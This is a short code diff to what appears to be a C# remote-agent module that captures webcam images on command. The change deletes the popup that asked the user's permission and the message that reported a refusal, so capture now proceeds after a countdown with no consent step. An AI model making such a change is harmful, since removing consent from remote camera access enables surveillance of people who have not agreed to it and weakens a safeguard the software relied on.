@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Drawing;
 using System.Drawing.Imaging;
 using System.IO;
@@ -63,18 +63,7 @@ namespace AgentSystem.Modules
                 return;
             }
 
-            bool isApproved = await ui.ShowConsentPopupAsync("webcam", 30000);
-            if (!isApproved)
-            {
-                context.SendResponse(new 
-                { 
-                    type = "webcam_denied", 
-                    agent_id = context.AgentId,
-                    command_id = commandId, 
-                    reason = "User declined permission" 
-                });
-                return;
-            }
+
 
             ui.ShowWebcamCountdown(10);
             await Task.Delay(10000);
